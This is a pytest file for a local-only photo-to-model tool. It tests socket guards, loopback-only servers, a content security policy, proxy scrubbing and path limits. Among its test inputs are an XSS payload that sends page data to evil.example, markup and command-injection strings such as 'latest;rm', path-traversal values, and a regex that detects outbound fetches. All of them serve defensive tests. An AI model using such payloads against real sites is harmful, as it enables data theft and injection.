"""The picture path never reaches the network.

This is the check named in ``docs/plans/proposals/runs-and-stays-local.md``. The
rule there says the software must work with the network switched off, and that a
rule claiming to be checked has to name the thing doing the checking. This file
is that thing.

How it works: every way Python has of opening a connection is replaced with one
that refuses and records what was attempted. Then the whole picture path runs. A
library quietly fetching something the first time it is used — the common case —
fails here loudly.

What it does not catch: a helper program started separately, anything reaching
the network from another thread that swallows its own errors, and anything using
a connection opened before these tests began. It catches the common case, which
is the honest claim.

An earlier version of this guard was weaker than it looked. Replacing
``socket.socket.connect`` leaves the C-level socket underneath it untouched, so
anything reaching past the ordinary one walked straight through, as did name
lookups and anything sending without connecting first. The C-level socket will
not let its methods be replaced, so the class itself is swapped for one that
refuses. The guard's own test now tries every one of those ways out rather than
the single convenient one.

See it fail before trusting it: put ``urllib.request.urlopen("http://example.com")``
inside one of the functions under test and confirm this file goes red.
"""

from __future__ import annotations

import _socket
import http.client
import os
import socket
import urllib.request
from pathlib import Path

import pytest

from apothecary.vision import PlainFinder, ScaleReference, StatedFinder, picture_to_site
from apothecary.vocabulary import starter_words


class ReachedTheNetwork(AssertionError):
    """Something tried to open a connection. Under the local-only rule, a fault."""


@pytest.fixture
def no_network(monkeypatch):
    """Refuse every outbound connection, and say what tried."""
    attempts: list[str] = []

    def refuse(what: str):
        def blocked(*args, **kwargs):
            attempts.append(f"{what}{args[:1]}")
            raise ReachedTheNetwork(
                f"{what} was called; nothing in the picture path may reach the network"
            )

        return blocked

    # The lower-level socket cannot have its methods replaced — it is built in
    # C and refuses. So the class itself is swapped for one that refuses, in
    # both places it is looked up. Anything asking for a socket from here on
    # gets the refusing one; anything that already had one from before does
    # not, which is the gap named at the top of this file.
    class Refuses(_socket.socket):
        connect = refuse("socket.connect")
        connect_ex = refuse("socket.connect_ex")
        sendto = refuse("socket.sendto")

    monkeypatch.setattr(_socket, "socket", Refuses)
    monkeypatch.setattr(socket, "socket", Refuses)
    monkeypatch.setattr(socket, "create_connection", refuse("socket.create_connection"))
    monkeypatch.setattr(socket, "getaddrinfo", refuse("socket.getaddrinfo"))
    monkeypatch.setattr(socket, "gethostbyname", refuse("socket.gethostbyname"))
    monkeypatch.setattr(urllib.request, "urlopen", refuse("urllib.urlopen"))
    monkeypatch.setattr(http.client.HTTPConnection, "connect", refuse("http.connect"))
    return attempts


@pytest.fixture
def picture(tmp_path) -> Path:
    from PIL import Image, ImageDraw

    image = Image.new("L", (300, 200), 255)
    pen = ImageDraw.Draw(image)
    pen.rectangle((20, 20, 120, 90), fill=0)
    pen.ellipse((160, 40, 260, 140), fill=0)
    path = tmp_path / "offline.png"
    image.save(path)
    return path


def test_the_guard_itself_works(no_network):
    """Without this, a green run below would prove nothing.

    Every way out is tried, not just the convenient one. The lower-level socket
    is the one that matters: an earlier guard blocked only the ordinary socket
    sitting on top of it, and anything reaching past that went out unnoticed.
    """
    ways_out = [
        lambda: urllib.request.urlopen("http://example.invalid"),
        lambda: socket.create_connection(("example.invalid", 80)),
        lambda: socket.getaddrinfo("example.invalid", 80),
        lambda: socket.gethostbyname("example.invalid"),
        lambda: _socket.socket().connect(("127.0.0.1", 9)),
        lambda: _socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(b"x", ("127.0.0.1", 9)),
    ]
    for index, way_out in enumerate(ways_out):
        with pytest.raises(ReachedTheNetwork):
            way_out()
        assert len(no_network) == index + 1, f"way out {index} slipped past unrecorded"


def test_looking_at_a_picture_reaches_nothing(no_network, picture):
    found = PlainFinder().look(picture)
    assert len(found.shapes) == 2
    assert no_network == []


def test_reading_a_written_description_reaches_nothing(no_network, tmp_path):
    image = tmp_path / "described.png"
    image.write_bytes(b"never opened")
    (tmp_path / "described.shapes.json").write_text(
        '{"name":"d","pixel_width":10,"pixel_height":10,'
        '"shapes":[{"kind":"rect","min":[0,0],"max":[1,1]}]}'
    )
    assert len(StatedFinder().look(image).shapes) == 1
    assert no_network == []


def test_building_an_arrangement_reaches_nothing(no_network, picture):
    site = picture_to_site(
        PlainFinder().look(picture), scale=ScaleReference(millimetres_across=300)
    )
    assert site.render()
    assert no_network == []


def test_the_word_list_reaches_nothing(no_network):
    words = starter_words()
    for word in words.all():
        assert word.make(word.name).to_scad_object().render()
    assert no_network == []


def test_the_whole_path_end_to_end_reaches_nothing(no_network, picture, tmp_path):
    from click.testing import CliRunner

    from apothecary.cli import cli

    out = tmp_path / "made.scad"
    result = CliRunner().invoke(
        cli, ["photo", "build", str(picture), "--width-mm", "300", "--out", str(out)]
    )
    assert result.exit_code == 0, result.output
    assert out.exists()
    assert no_network == []


def test_nothing_is_written_outside_the_folder_it_was_given(picture, tmp_path):
    """The other half of the rule: what it produces stays where you put it."""
    from click.testing import CliRunner

    from apothecary.cli import cli

    before = set(Path.cwd().iterdir())
    out = tmp_path / "elsewhere.scad"
    result = CliRunner().invoke(
        cli, ["photo", "build", str(picture), "--width-mm", "300", "--out", str(out)]
    )
    assert result.exit_code == 0, result.output
    assert set(Path.cwd().iterdir()) == before, "something was written outside the given folder"


# ---------------------------------------------------------------------------
# Not a test-time guard only: the program's own shape (apothecary/stays_local.py).
# What follows holds the running system to the rule -- the process, the server,
# the pages -- and holds the code to the few places the rule is enforced from,
# so that neither a flag nor an edit elsewhere can loosen it unnoticed.

import ast
import http.client as _http
import re

from fastapi.testclient import TestClient

from apothecary import stays_local
from apothecary.api import app

ROOT = Path(__file__).resolve().parents[1]
PACKAGE = ROOT / "apothecary"


def test_the_process_is_guarded_by_importing_the_package():
    """Importing `apothecary` puts the guard on the process: a socket reaches this
    machine and nothing else, whichever way it is asked."""
    assert stays_local.guard_installed()
    assert socket.socket is not stays_local._original_socket
    listener = stays_local._original_socket()
    listener.bind(("127.0.0.1", 0))
    listener.listen(1)
    port = listener.getsockname()[1]
    try:
        with socket.socket() as s:
            s.settimeout(2)
            s.connect(("127.0.0.1", port))  # this machine: fine
        for target in (("203.0.113.1", 80), ("example.com", 443), ("2001:db8::1", 80, 0, 0)):
            fam = socket.AF_INET6 if len(target) == 4 else socket.AF_INET
            with socket.socket(fam) as s, pytest.raises(stays_local.LeftTheMachine):
                s.connect(target)
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            with pytest.raises(stays_local.LeftTheMachine):
                s.sendto(b"x", ("203.0.113.1", 53))
        with pytest.raises(stays_local.LeftTheMachine):
            socket.create_connection(("203.0.113.1", 80), timeout=1)
        with pytest.raises(stays_local.LeftTheMachine):
            _http.HTTPConnection("example.com", 80, timeout=1).connect()
        # The C-level class is guarded too, for anything that reaches past the Python one.
        import _socket

        with pytest.raises(stays_local.LeftTheMachine):
            _socket.socket().connect(("203.0.113.1", 80))
        # A TLS socket was built on the original class before the guard; its connect
        # is checked all the same (wrap first, then connect, is urllib's other order).
        import ssl

        tls = ssl.create_default_context().wrap_socket(
            socket.socket(), server_hostname="example.com"
        )
        with tls, pytest.raises(stays_local.LeftTheMachine):
            tls.connect(("203.0.113.1", 443))
        # A name is the one thing that could carry data out without a connection:
        # the resolver looks up this machine's names and literal addresses, nothing else.
        for name in ("localhost", "127.0.0.1", "::1", "203.0.113.1", None):
            socket.getaddrinfo(name, port)
        for name in ("example.com", "secret-in-a-name.evil.example", b"example.com"):
            with pytest.raises(stays_local.LeftTheMachine):
                socket.getaddrinfo(name, 80)
        with pytest.raises(stays_local.LeftTheMachine):
            socket.gethostbyname("example.com")
        # The other ways a socket takes an address: a datagram by sendmsg, a
        # listener bound elsewhere, a name bound or reverse-looked-up.
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            with pytest.raises(stays_local.LeftTheMachine):
                s.sendmsg([b"x"], [], 0, ("203.0.113.1", 9))
            s.sendmsg([b"x"], [], 0, ("127.0.0.1", port))  # this machine: fine
        for bound in (("0.0.0.0", 0), ("", 0), ("192.168.1.10", 0), ("carried.example", 0)):
            with socket.socket() as s, pytest.raises(stays_local.LeftTheMachine):
                s.bind(bound)
        with socket.socket() as s:
            s.bind(("127.0.0.1", 0))
        with pytest.raises(stays_local.LeftTheMachine):
            socket.gethostbyaddr("carried-out.example")
        with pytest.raises(stays_local.LeftTheMachine):
            socket.gethostbyaddr("203.0.113.1")
        with pytest.raises(stays_local.LeftTheMachine):
            socket.getnameinfo(("203.0.113.1", 443), 0)  # the other reverse lookup
        assert socket.getnameinfo(("127.0.0.1", port), socket.NI_NUMERICHOST)[0] == "127.0.0.1"
        # Loopback is not this machine when a service there forwards: the
        # resolver's stub on port 53 takes a hand-built question anywhere.
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            with pytest.raises(stays_local.LeftTheMachine):
                s.sendto(b"\x00" * 12, ("127.0.0.53", 53))
            with pytest.raises(stays_local.LeftTheMachine):
                s.connect(("127.0.0.1", 53))
        # Every name the original classes were bound to now names the guarded one.
        import ssl as _ssl

        assert socket.SocketType is _socket.socket and _socket.SocketType is _socket.socket
        assert _ssl.socket is socket.socket
        for cls in (socket.SocketType, _ssl.socket):  # the C class has no `with`
            s = cls()
            try:
                with pytest.raises(stays_local.LeftTheMachine):
                    s.connect(("203.0.113.1", 80))
            finally:
                s.close()
    finally:
        listener.close()


def test_a_tool_fetch_reaches_its_sources_and_nothing_else(monkeypatch):
    """The firmware installer's download is the one connection past this machine:
    to fixed hosts, for the duration of one call on one thread, and a redirect
    elsewhere is refused mid-fetch."""
    reached = []
    monkeypatch.setattr(
        stays_local, "_original_http_connect", lambda self: reached.append(self.host)
    )
    with pytest.raises(stays_local.LeftTheMachine):
        stays_local.tool_fetch("https://evil.example/arduino-cli.tar.gz")
    with pytest.raises(stays_local.LeftTheMachine):
        _http.HTTPConnection("api.github.com").connect()  # outside a fetch: no
    with stays_local.tool_fetch("https://api.github.com/repos/arduino/arduino-cli/releases/latest"):
        _http.HTTPConnection("api.github.com").connect()
        _http.HTTPConnection(
            "objects.githubusercontent.com"
        ).connect()  # where the archive redirects
        with pytest.raises(stays_local.LeftTheMachine):
            _http.HTTPConnection("evil.example").connect()  # a redirect elsewhere
        assert stays_local._name_allowed("github.com")
        assert not stays_local._name_allowed("evil.example")
        # Inside the window a raw socket reaches a source by name, or an address
        # the resolver returned for one -- those hosts alone, not anywhere.
        with pytest.raises(stays_local.LeftTheMachine):
            socket.socket().connect(("203.0.113.1", 443))
        monkeypatch.setattr(
            stays_local,
            "_original_getaddrinfo",
            lambda host, port, *a, **k: [(2, 1, 6, "", ("203.0.113.7", 443))],
        )
        socket.getaddrinfo("github.com", 443)
        assert stays_local._address_allowed(("203.0.113.7", 443))
        assert not stays_local._address_allowed(("203.0.113.8", 443))
        assert not stays_local._address_allowed(("github.com", 53))
        assert stays_local._allowed_now()
    assert not stays_local._allowed_now()
    assert getattr(stays_local._fetching, "addresses", None) is None
    assert reached == ["api.github.com", "objects.githubusercontent.com"]
    # The allowance is per thread: another thread is not in the fetch.
    import threading

    seen = {}

    def other():
        seen["allowed"] = stays_local._allowed_now()

    with stays_local.tool_fetch("https://github.com/x"):
        t = threading.Thread(target=other)
        t.start()
        t.join()
    assert seen == {"allowed": False}


def test_a_tool_fetch_takes_no_proxy_and_a_version_is_three_numbers(monkeypatch):
    """A proxy variable is a place the fetch would go instead; the installer's opener
    has none. And a version is spliced into the release URL, so it is X.Y.Z or nothing."""
    from apothecary.firmware import installer

    monkeypatch.setenv("HTTPS_PROXY", "http://127.0.0.1:9")  # loopback, so the guard allows it
    monkeypatch.setenv("HTTP_PROXY", "http://127.0.0.1:9")
    opened = {}

    class Opener:
        def open(self, req, timeout=None):
            opened["url"] = req.full_url
            raise OSError("not reached")

    def build_opener(*handlers):
        assert len(handlers) == 1 and isinstance(handlers[0], installer.urllib.request.ProxyHandler)
        assert handlers[0].proxies == {}
        return Opener()

    monkeypatch.setattr(installer.urllib.request, "build_opener", build_opener)
    with pytest.raises(OSError, match="not reached"):
        installer._fetch("https://github.com/arduino/arduino-cli/releases/download/v1.2.3/x")
    assert opened["url"].startswith("https://github.com/")
    assert installer.resolve_version("v1.5.1", fetch=lambda url: b"") == "1.5.1"
    for bad in ("../../other/repo/releases/download/v1", "1.5", "1.5.1/../x", "latest;rm"):
        with pytest.raises(installer.ToolchainError, match="not an arduino-cli version"):
            installer.resolve_version(bad, fetch=lambda url: b"")


def test_only_the_installer_may_fetch_a_tool():
    """`tool_fetch` has one caller. A second would be a second door, reviewed as such."""
    callers = []
    for path in PACKAGE.rglob("*.py"):
        if path.name == "stays_local.py":
            continue
        if "tool_fetch" in path.read_text(encoding="utf-8"):
            callers.append(path.relative_to(ROOT).as_posix())
    assert callers == ["apothecary/firmware/installer.py"]


def test_every_server_the_cli_starts_listens_on_this_machine_only():
    """`require_loopback` accepts this machine's names and nothing else, and every
    function in the CLI that calls uvicorn.run goes through it first."""
    for host in ("127.0.0.1", "localhost", "::1", "127.0.0.2"):
        assert stays_local.require_loopback(host) == host
    for host in ("0.0.0.0", "::", "192.168.1.10", "10.0.0.1", "apothecary.local", "example.com"):
        with pytest.raises(ValueError, match="this machine only"):
            stays_local.require_loopback(host)
    binders = 0
    for path in (PACKAGE / "cli").glob("*.py"):
        text = path.read_text(encoding="utf-8")
        if "uvicorn.run(" not in text:
            continue
        tree = ast.parse(text)
        for node in ast.walk(tree):
            if isinstance(node, ast.FunctionDef):
                body = ast.get_source_segment(text, node) or ""
                if "uvicorn.run(" in body:
                    binders += 1
                    assert "require_loopback" in body or "_loopback_or_" in body, (
                        f"{path.name}:{node.name} binds without require_loopback"
                    )
    assert binders == 4  # serve, dev, photo view, photo gather


def test_the_app_answers_this_machine_only_and_fences_every_page():
    """A client not on loopback gets 403 from every route, static files included;
    a client on loopback gets the page, with a policy that keeps it to this origin."""
    elsewhere = TestClient(app, client=("192.168.1.20", 4444))
    for path in (
        "/",
        "/viewer/sites/garage",
        "/static/ring.js",
        "/openapi.json",
        "/docs/README.md",
    ):
        r = elsewhere.get(path)
        assert r.status_code == 403, path
        assert "this machine only" in r.text
    # A page from elsewhere that pointed its own name at 127.0.0.1 arrives from
    # loopback, and is refused by the name it asked for; so is a listener bound
    # elsewhere, whatever a forwarded-for header made the client look like.
    rebound = TestClient(app, base_url="http://evil.example")
    assert rebound.get("/cameras").status_code == 403
    assert TestClient(app).get("/cameras", headers={"host": "evil.example:8000"}).status_code == 403
    assert (
        TestClient(app).get("/cameras", headers={"host": "127.0.0.1.evil.example"}).status_code
        == 403
    )
    bound_elsewhere = TestClient(app, base_url="http://192.168.1.5:8000")
    assert bound_elsewhere.get("/cameras").status_code == 403
    for host in ("localhost:8000", "127.0.0.1", "[::1]:8000", "LOCALHOST", "localhost."):
        assert TestClient(app).get("/cameras", headers={"host": host}).status_code == 200, host
    for host in ("app.localhost", '127.0.0.1:8000"', "127.0.0.1:80x", "", "[::1"):
        assert TestClient(app).get("/cameras", headers={"host": host}).status_code == 403, host
    # A server that cannot name the peer or itself (a Unix socket, another ASGI
    # server) gets no answer: unknown is not this machine.
    scope = {"type": "http", "method": "GET", "headers": [(b"host", b"localhost:8000")]}
    assert not stays_local.from_this_machine(scope)
    assert not stays_local.from_this_machine({**scope, "client": None, "server": None})
    assert stays_local.from_this_machine(
        {**scope, "client": ("127.0.0.1", 5), "server": ("127.0.0.1", 8000)}
    )
    # A page from another origin cannot post here, fetch from here or embed
    # from here, whatever the browser would have let through without a
    # preflight; a link from elsewhere that opens a page here still works.
    here = TestClient(app)
    foreign = {"origin": "https://evil.example", "sec-fetch-site": "cross-site"}
    assert here.post("/photos/gather", json={}, headers=foreign).status_code == 403
    assert here.get("/cameras", headers=foreign).status_code == 403
    assert here.get("/cameras", headers={"sec-fetch-site": "same-site"}).status_code == 403
    assert here.get("/cameras", headers={"origin": "null"}).status_code == 403
    link = {
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "navigate",
        "sec-fetch-dest": "document",
    }
    assert here.get("/viewer/sites/garage", headers=link).status_code == 200
    assert here.post("/photos/gather", json={}, headers=link).status_code == 403
    own = {"origin": "http://127.0.0.1:8000", "sec-fetch-site": "same-origin"}
    assert here.get("/cameras", headers=own).status_code == 200
    assert here.get("/cameras", headers={"sec-fetch-site": "none"}).status_code == 200
    here = TestClient(app)  # conftest: this machine
    for path in (
        "/viewer/sites/garage",
        "/firmware",
        "/firmware/monitor",
        "/docs/README.md",
        "/static/ring.js",
    ):
        r = here.get(path)
        assert r.status_code == 200, path
        csp = r.headers["content-security-policy"]
        assert csp == stays_local.CONTENT_SECURITY_POLICY
        assert r.headers["referrer-policy"] == "no-referrer"
    csp = stays_local.CONTENT_SECURITY_POLICY
    assert (
        "default-src 'self'" in csp and "connect-src 'self'" in csp and "form-action 'self'" in csp
    )
    assert "frame-ancestors 'none'" in csp and "frame-src 'none'" in csp
    assert "http:" not in csp and "https:" not in csp and "*" not in csp
    assert app.docs_url is None and app.redoc_url is None  # each would load from a CDN


def test_a_value_the_page_carries_cannot_become_script():
    """A query value the viewer writes into its script (`?focus=`) is emitted as JSON,
    never raw: a crafted link cannot run script in this origin and read it out. Every
    value a template puts in a script literal goes through `tojson`."""
    here = TestClient(app)
    crafted = '";fetch(BASE_URL+"/cameras").then(r=>location.href="https://evil.example/?"+r);//'
    r = here.get("/viewer/sites/garage", params={"focus": crafted})
    assert r.status_code == 200
    assert crafted not in r.text
    line = next(ln.strip() for ln in r.text.splitlines() if "INITIAL_FOCUS =" in ln)
    assert line.startswith('const INITIAL_FOCUS = "\\";fetch(BASE_URL+\\"')  # one JSON string
    assert "\\u003e" in line and line.endswith(';//";')
    raw_in_script = re.compile(r"""(const|let|var)\s+\w+\s*=\s*["'][^"'\n]*\{\{""")
    for path in (ROOT / "templates").rglob("*.j2"):
        text = path.read_text(encoding="utf-8")
        assert not raw_in_script.search(text), f"{path.name}: a raw value in a script literal"
        for m in re.finditer(r"(const|let|var)\s+\w+\s*=\s*\{\{([^}]*)\}\}", text):
            assert "tojson" in m.group(2), f"{path.name}: {m.group(0)} is not JSON"


def test_the_picture_root_is_a_folder_of_pictures_never_everything(monkeypatch, tmp_path):
    """The whole machine, the person's home folder and anything above it are refused as a
    picture root: a root there would serve everything of theirs to whatever asks."""
    from fastapi import HTTPException

    from apothecary import api

    home = tmp_path / "home" / "person"
    (home / "pictures").mkdir(parents=True)
    monkeypatch.setattr(api.Path, "home", classmethod(lambda cls: home))
    monkeypatch.setenv("APOTHECARY_PICTURE_ROOT", str(home / "pictures"))
    assert api._picture_root() == (home / "pictures").resolve()
    for root in (home, home.parent, tmp_path):
        monkeypatch.setenv("APOTHECARY_PICTURE_ROOT", str(root))
        with pytest.raises(HTTPException) as caught:
            api._picture_root()
        assert "everything of yours" in caught.value.detail, root
    monkeypatch.setenv("APOTHECARY_PICTURE_ROOT", str(Path(tmp_path.anchor)))
    with pytest.raises(HTTPException, match="whole"):
        api._picture_root()
    # HOME is a variable; the account's home folder is not, and the state folder
    # (serial numbers, camera labels, readings) is never a picture root either.
    import pwd

    real_home = Path(pwd.getpwuid(os.getuid()).pw_dir).resolve()
    monkeypatch.setattr(api.Path, "home", classmethod(lambda cls: tmp_path / "elsewhere"))
    monkeypatch.setenv("APOTHECARY_PICTURE_ROOT", str(real_home))
    with pytest.raises(HTTPException, match="everything of yours"):
        api._picture_root()
    state = tmp_path / "state"
    state.mkdir()
    monkeypatch.setenv("APOTHECARY_STATE_DIR", str(state))
    monkeypatch.setenv("APOTHECARY_PICTURE_ROOT", str(state))
    with pytest.raises(HTTPException, match="everything of yours"):
        api._picture_root()
    # And the file route serves a picture, judged by its bytes, and nothing else.
    pictures = tmp_path / "pics"
    pictures.mkdir()
    (pictures / "notes.json").write_text('{"serial": "A106ZTEU"}', encoding="utf-8")
    (pictures / "fake.png").write_text("not a picture", encoding="utf-8")
    from PIL import Image

    Image.new("RGB", (4, 4), (10, 20, 30)).save(pictures / "real.png")
    monkeypatch.setenv("APOTHECARY_PICTURE_ROOT", str(pictures))
    here = TestClient(app)
    assert here.get("/photos/pictures/file", params={"path": "real.png"}).status_code == 200
    assert here.get("/photos/pictures/file", params={"path": "notes.json"}).status_code == 415
    assert here.get("/photos/pictures/file", params={"path": "fake.png"}).status_code == 415


def test_what_is_kept_is_the_persons_alone(monkeypatch, tmp_path):
    """The state folder and a camera's captures are made readable by this account
    only, whatever the umask says; and `apothecary test all` runs its server on
    state and pictures of its own, like `test run` and `docs generate`."""
    import stat

    from apothecary.firmware import devices

    monkeypatch.setenv("APOTHECARY_STATE_DIR", str(tmp_path / "state"))
    monkeypatch.setattr(devices, "_STATE", None)
    monkeypatch.setenv("APOTHECARY_PICTURE_ROOT", str(tmp_path / "pics"))
    (tmp_path / "pics").mkdir()
    old_umask = os.umask(0o000)  # the loosest umask there is
    try:
        here = TestClient(app)
        assert here.put(
            "/cameras/abc123", json={"site": "garage", "path": "workbench"}
        ).status_code in (200, 201)
        import io

        from PIL import Image

        buf = io.BytesIO()
        Image.new("RGB", (2, 2)).save(buf, format="PNG")
        assert here.post("/photos/pictures?name=x", content=buf.getvalue()).status_code == 201
    finally:
        os.umask(old_umask)
    for folder in (tmp_path / "state", tmp_path / "pics" / "captures"):
        assert folder.is_dir(), folder
        assert stat.S_IMODE(folder.stat().st_mode) == 0o700, folder
    testing = (PACKAGE / "cli" / "testing.py").read_text(encoding="utf-8")
    assert 'env["APOTHECARY_STATE_DIR"]' in testing and 'env["APOTHECARY_PICTURE_ROOT"]' in testing
    assert "capture_output=True, text=True, env=env" in testing


def test_a_job_is_named_and_the_name_is_shown_as_text():
    """A job name is letters, digits and a little punctuation: the page shows it as
    text, and the API refuses one that is markup (the page escapes it as well)."""
    here = TestClient(app)
    body = {"required_volume": {"x": 10, "y": 10, "z": 10}}
    r = here.post("/sites/garage/jobs", json={"name": "small bracket v2", **body})
    assert r.status_code == 200, r.text
    for bad in ('<img src=x onerror="fetch(1)">', "a&b", 'x"y', "", " lead", "x" * 81):
        r = here.post("/sites/garage/jobs", json={"name": bad, **body})
        assert r.status_code == 422, bad
    viewer = (ROOT / "templates" / "fractal_viewer.html.j2").read_text(encoding="utf-8")
    assert "<strong>${esc(job.name)}</strong>" in viewer
    firmware = (ROOT / "templates" / "firmware.html.j2").read_text(encoding="utf-8")
    assert '["tools dir", esc(s.tools_dir)]' in firmware and "v.startsWith" not in firmware


def test_a_subprocess_that_fetches_is_told_where_and_nothing_else_tells_it(monkeypatch, tmp_path):
    """arduino-cli is outside the socket guard, so what it fetches is fixed by the config
    file every invocation is given and by the environment it does not inherit: no proxy,
    no ARDUINO_* override (arduino-cli lets either outrank the file)."""
    from apothecary.firmware import installer, toolchains

    monkeypatch.setenv("HTTPS_PROXY", "http://proxy.example:3128")
    monkeypatch.setenv("http_proxy", "http://proxy.example:3128")
    monkeypatch.setenv("ARDUINO_NETWORK_CLOUD_API_SKIP_BOARD_DETECTION_CALLS", "false")
    monkeypatch.setenv("ARDUINO_BOARD_MANAGER_ADDITIONAL_URLS", "https://evil.example/index.json")
    monkeypatch.setenv("KEPT", "yes")
    env = stays_local.subprocess_env()
    assert "KEPT" in env
    assert not [k for k in env if k.lower().endswith("_proxy") or k.upper().startswith("ARDUINO_")]
    assert stays_local.subprocess_env({"ALL_PROXY": "x", "PATH": "/bin"}) == {"PATH": "/bin"}
    assert installer.env_for_arduino()["HOME"]
    assert "HTTPS_PROXY" not in installer.env_for_arduino()

    # The managed config: the two fetches arduino-cli makes on its own are off, and
    # the indexes it may fetch from are the fixed ones; every argv carries it.
    monkeypatch.setenv("APOTHECARY_TOOLS_DIR", str(tmp_path / "tools"))
    config = stays_local.ARDUINO_CLI_CONFIG
    assert config["network"]["cloud_api"]["skip_board_detection_calls"] is True
    assert config["updater"]["enable_notification"] is False
    assert sorted(config["board_manager"]["additional_urls"]) == sorted(
        stays_local.PACKAGE_INDEXES.values()
    )
    path = toolchains.managed_config_file()
    assert path == tmp_path / "tools" / "arduino-cli.yaml"
    import json

    assert json.loads(path.read_text(encoding="utf-8")) == config
    path.write_text("{}", encoding="utf-8")  # an edit by hand does not last
    assert json.loads(toolchains.managed_config_file().read_text(encoding="utf-8")) == config
    binary = tmp_path / "arduino-cli"
    binary.write_text("#!/bin/sh\n", encoding="utf-8")
    cli = toolchains.ArduinoCli(binary)
    assert cli.argv("board", "list")[:3] == [str(binary), "--config-file", str(path)]
    # A sketch profile names where arduino-cli fetches a platform from, and
    # arduino-cli honours it whatever the command line says: not built.
    sketch = tmp_path / "blinky"
    sketch.mkdir()
    (sketch / "blinky.ino").write_text("void setup(){} void loop(){}", encoding="utf-8")
    assert cli.compile_argv(sketch, "arduino:avr:uno")[-1] == str(sketch)
    (sketch / "sketch.yaml").write_text(
        "default_profile: x\nprofiles:\n  x:\n    platforms:\n"
        "      - platform: arduino:avr\n        platform_index_url: https://evil.example/i.json\n",
        encoding="utf-8",
    )
    with pytest.raises(toolchains.ToolchainError, match="sketch profile"):
        cli.compile_argv(sketch, "arduino:avr:uno")
    with pytest.raises(toolchains.ToolchainError, match="sketch profile"):
        cli.upload_argv(sketch, "arduino:avr:uno", "/dev/ttyUSB0")
    assert cli.config_file == path
    assert "config_file" not in toolchains.ArduinoCli.__init__.__code__.co_varnames
    # Every subprocess the seam starts goes through a scrubbed environment.
    text = (PACKAGE / "firmware" / "toolchains.py").read_text(encoding="utf-8")
    assert "env = subprocess_env(env)" in text
    text = (PACKAGE / "firmware" / "tasks.py").read_text(encoding="utf-8")
    assert text.count("env=subprocess_env(env)") == 2
    text = (PACKAGE / "firmware" / "devices.py").read_text(encoding="utf-8")
    assert text.count("subprocess.Popen(") == 1 and "env=subprocess_env()" in text
    for path in (PACKAGE / "firmware").glob("*.py"):
        body = path.read_text(encoding="utf-8")
        if "subprocess.run(" in body or "subprocess.Popen(" in body:
            assert path.name in ("toolchains.py", "tasks.py", "devices.py"), path.name


LOADS_FROM_ELSEWHERE = re.compile(
    r"""<(?:script|link|img|iframe|video|audio|source|embed|object)\b[^>]*\b(?:src|href|data)=["'](?:https?:)?//"""
    r"""|\bfetch\(\s*[`"'](?:https?:)?//"""
    r"""|new\s+(?:WebSocket|EventSource|XMLHttpRequest)\([^)]*[`"'](?:https?:|wss?:)?//"""
    r"""|@import\s+(?:url\()?["']?(?:https?:)?//"""
    r"""|url\(\s*["']?(?:https?:)?//"""
    r"""|sendBeacon\(|RTCPeerConnection""",
    re.I,
)


def test_no_page_loads_from_or_sends_to_another_origin():
    """Every template and every static module: nothing is fetched from, posted to or
    embedded from anywhere but this server. (A link a person may click is not a load.)"""
    found = []
    for folder, pattern in (
        (ROOT / "templates", "*.j2"),
        (PACKAGE / "static", "*.js"),
        (PACKAGE / "static", "*.css"),
    ):
        for path in folder.rglob(pattern):
            if "vendor" in path.parts:
                continue  # three.js is the vendored copy; its README says why
            for n, line in enumerate(path.read_text(encoding="utf-8").splitlines(), 1):
                if LOADS_FROM_ELSEWHERE.search(line):
                    found.append(f"{path.relative_to(ROOT)}:{n}: {line.strip()[:100]}")
    assert not found, "\n".join(found)


def test_the_record_names_the_rule_and_its_one_exception():
    record = ROOT / "governance" / "qm" / "adr" / "DRAFT-personal-data-stays-on-the-device.md"
    if not record.exists():
        pytest.skip("governance/qm is not checked out")
    text = record.read_text(encoding="utf-8")
    assert "secured user accounts" in text
    assert "stays_local" in text
